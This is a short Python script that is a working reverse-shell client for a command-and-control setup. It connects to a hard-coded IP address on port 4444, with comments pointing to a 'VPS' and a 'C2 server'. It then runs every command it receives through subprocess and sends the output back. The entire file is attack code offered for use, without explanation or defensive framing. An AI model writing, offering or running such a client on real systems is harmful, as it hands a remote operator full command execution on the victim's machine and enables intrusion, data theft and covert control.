import socket
import subprocess

host = "18.217.147.188"  # replace with your VPS IP
port = 4444  # ensure this matches the C2 server port

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))

while True:
    command = client_socket.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    client_socket.send(bytes(output, "utf-8"))
client_socket.close()